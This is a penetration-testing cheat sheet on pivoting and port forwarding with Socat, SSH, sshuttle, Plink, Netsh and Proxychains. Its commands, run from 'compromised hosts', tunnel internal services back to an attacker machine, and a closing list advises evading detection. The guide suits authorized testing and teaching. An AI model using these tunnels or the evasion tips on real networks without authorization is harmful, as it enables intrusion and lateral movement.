# Port Forwarding and SSH Tunneling Guide

Complete reference for port redirection and SSH tunneling techniques including Socat, SSH local/dynamic/remote forwarding, sshuttle, Windows ssh.exe, Plink, Netsh, and Proxychains configuration.

---

## Decision Tree

```
Can you bind ports on the compromised host?
  YES -> Use Local Port Forwarding or Dynamic Port Forwarding
  NO  -> Can you SSH out?
    YES -> Use Remote Port Forwarding or Remote Dynamic Port Forwarding
    NO  -> Use reverse shells or other techniques
```

## Tool Comparison

| Tool | Platform | Root/Admin | Flexibility | Stealth | Use Case |
|------|----------|------------|-------------|---------|----------|
| Socat | Linux | No | Low (1 port) | Low | Simple port forward |
| SSH Local | Linux | No | Low (1 port) | Medium | Single service access |
| SSH Dynamic | Linux | No | High (SOCKS) | Medium | Multiple services |
| SSH Remote | Linux | No | Low (1 port) | Medium | Behind firewall |
| SSH Remote Dynamic | Linux | No | High (SOCKS) | Medium | Behind firewall + flexibility |
| sshuttle | Linux | Yes | Very High | Medium | VPN-like access |
| ssh.exe | Windows | No | High (SOCKS) | High | Modern Windows (10 1803+) |
| Plink | Windows | No | Low (1 port) | High | Legacy Windows |
| Netsh | Windows | Yes | Low (1 port) | Low | Native Windows |

---

## Socat Port Forwarding

### Basic Port Forward
```bash
socat TCP-LISTEN:<LOCAL_PORT>,fork TCP:<DEST_IP>:<DEST_PORT>
```

### Examples
```bash
# Forward port 2345 to PostgreSQL
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

# Forward port 2222 to SSH
socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
```

**Options:**
- `-ddd`: Verbose debug output
- `fork`: Fork subprocess for each connection

### Alternative Tools
- **rinetd**: Runs as daemon, better for long-term forwarding
- **iptables**: Requires root, `echo 1 > /proc/sys/net/ipv4/conf/[interface]/forwarding`

---

## SSH Local Port Forwarding

Packets are forwarded by the SSH server. The SSH client listens on a local port and tunnels traffic through the SSH connection.

### Syntax
```bash
ssh -N -L [LOCAL_IP:]LOCAL_PORT:DEST_IP:DEST_PORT [USER]@[SSH_SERVER]
```

### Example
```bash
# Forward port 4455 to SMB on internal host through SSH server
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

### Usage
```bash
# Connect through the forward
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
```

### Verify
```bash
ss -ntplu | grep 4455
```

**Limitation:** One socket per SSH connection -- each forward maps to only one destination.

---

## SSH Dynamic Port Forwarding

Creates a SOCKS proxy server port. A single listening port can forward packets to any socket the SSH server can access.

### Syntax
```bash
ssh -N -D [LOCAL_IP:]LOCAL_PORT [USER]@[SSH_SERVER]
```

### Example
```bash
# Create SOCKS proxy on port 9999
ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
```

### Configure Proxychains
Edit `/etc/proxychains4.conf`:
```
[ProxyList]
socks5 192.168.50.63 9999
```

### Usage
```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 172.16.50.217
```

### Speed Optimization
In `/etc/proxychains4.conf`:
```
tcp_read_time_out 15000
tcp_connect_time_out 8000
```

**Note:** SOCKS5 supports authentication, IPv6, and UDP (including DNS). Proxychains uses LD_PRELOAD, so it will not work with statically linked binaries.

---

## SSH Remote Port Forwarding

The listening port is bound to the SSH server (your attack machine). Packets are forwarded by the SSH client (compromised host). Useful when inbound connections are blocked but outbound SSH is allowed.

### Syntax
```bash
ssh -N -R [SSH_SERVER_IP:]SSH_SERVER_PORT:DEST_IP:DEST_PORT [USER]@[SSH_SERVER]
```

### Example
```bash
# From compromised host, forward PostgreSQL back to attacker
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

### Setup SSH Server on Attacker
```bash
sudo systemctl start ssh
# Verify: sudo ss -ntplu | grep :22
```

### Usage from Attacker
```bash
psql -h 127.0.0.1 -p 2345 -U postgres
```

---

## SSH Remote Dynamic Port Forwarding

Creates a SOCKS proxy port on the SSH server (attacker machine) initiated from the compromised host. Requires OpenSSH client version 7.6+ on the compromised host.

### Syntax
```bash
ssh -N -R [SSH_SERVER_PORT] [USER]@[SSH_SERVER]
```

### Example
```bash
# From compromised host, create SOCKS proxy on attacker port 9998
ssh -N -R 9998 kali@192.168.118.4
```

### Configure Proxychains on Attacker
```
[ProxyList]
socks5 127.0.0.1 9998
```

### Usage
```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
proxychains smbclient -L //10.4.50.64/ -U user --password=pass
```

---

## sshuttle (VPN-like Tunneling)

Turns an SSH connection into VPN-like access by setting up local routes. Requires root on client and Python3 on SSH server.

### Syntax
```bash
sshuttle -r [USER]@[SSH_SERVER] [SUBNET1] [SUBNET2] ...
```

### Example
```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

### Common Options
```bash
# Exclude specific subnets
sshuttle -r user@host 10.0.0.0/8 -x 10.0.0.1/32

# Specific SSH port
sshuttle -r user@host:2222 10.0.0.0/24

# Verbose / daemon mode
sshuttle -v -r user@host 10.0.0.0/24
sshuttle -D -r user@host 10.0.0.0/24
```

### Usage After Setup
```bash
# No proxy needed -- traffic is transparently routed
smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
ssh user@10.4.50.215
nmap -sS 172.16.50.217
```

---

## Windows ssh.exe

OpenSSH client bundled with Windows 10 version 1803+ and Windows Server 2019+.

### Check Availability
```cmd
where ssh
ssh.exe -V
```

### Remote Dynamic Port Forward
```cmd
ssh.exe -N -R 9998 kali@192.168.118.4
```

### Configure Proxychains on Attacker
```
socks5 127.0.0.1 9998
```

---

## Windows Plink (PuTTY Link)

Command-line SSH client for Windows. Lightweight standalone executable commonly used by administrators.

### Location on Attacker
```bash
/usr/share/windows-resources/binaries/plink.exe
```

### Remote Port Forward
```cmd
plink.exe -ssh -l kali -pw password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

### Auto-accept Host Key (Non-interactive)
```cmd
cmd.exe /c echo y | plink.exe -ssh -l kali -pw password -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
```

### Usage from Attacker
```bash
xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
```

**Limitations:** No remote dynamic port forwarding. Password visible on command line (may be logged).

**Tip:** Create a dedicated limited user for port forwarding to avoid exposing credentials.

---

## Windows Netsh Port Forwarding

Native Windows tool requiring administrative privileges. Port forwards persist across reboots.

### Create Port Forward
```cmd
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
```

### Create Firewall Rule (Required)
```cmd
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
```

### Verify
```cmd
netsh interface portproxy show all
netstat -anp TCP | find "2222"
```

### Cleanup
```cmd
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```

### Other Options
```cmd
# IPv6 to IPv4
netsh interface portproxy add v6tov4 listenport=2222 listenaddress=:: connectport=22 connectaddress=10.4.50.215
```

### PowerShell Firewall Equivalents
```powershell
New-NetFirewallRule -DisplayName "port_forward_ssh_2222" -Direction Inbound -Protocol TCP -LocalPort 2222 -Action Allow
Remove-NetFirewallRule -DisplayName "port_forward_ssh_2222"
```

---

## Proxychains Configuration

### Setup
Edit `/etc/proxychains4.conf`:
```
[ProxyList]
socks5 127.0.0.1 9998
```

### Speed Optimization
```
tcp_read_time_out 15000
tcp_connect_time_out 8000
```

### Notes
- SOCKS5 supports authentication, IPv6, and UDP
- Proxychains uses LD_PRELOAD (does not work with statically linked binaries)
- Nmap `--proxies` option is still under development -- use Proxychains instead

---

## Verification Commands

### Linux
```bash
ss -ntplu | grep <PORT>
netstat -tulpn | grep <PORT>
ps aux | grep ssh
```

### Windows
```cmd
netstat -anp TCP | find "<PORT>"
netsh interface portproxy show all
netsh advfirewall firewall show rule name=all
```

---

## Common Ports Reference

| Service | Default Port | Protocol |
|---------|--------------|----------|
| SSH | 22 | TCP |
| RDP | 3389 | TCP |
| PostgreSQL | 5432 | TCP |
| SMB | 445 | TCP |
| HTTP | 80 | TCP |
| HTTPS | 443 | TCP |

---

## Troubleshooting

### Connection Refused
- Check if port forward is listening
- Verify firewall rules (Windows)
- Confirm SSH connection is established
- Verify destination IP/port is correct

### Timeout
- Check network connectivity and routing
- Increase Proxychains timeout values

### Permission Denied
- Check required privileges (root for sshuttle, admin for Netsh)
- Verify SSH server user permissions and configuration

### Host Key Issues (Plink)
```cmd
cmd.exe /c echo y | plink.exe [options]
```

---

## Best Practices

1. Clean up port forwards and firewall rules when done
2. Use non-standard ports to reduce detection
3. Use encrypted tunnels (SSH) over unencrypted (Socat)
4. Create dedicated users for port forwarding
5. Document all active port forwards
6. Consider timing and connection patterns for stealth
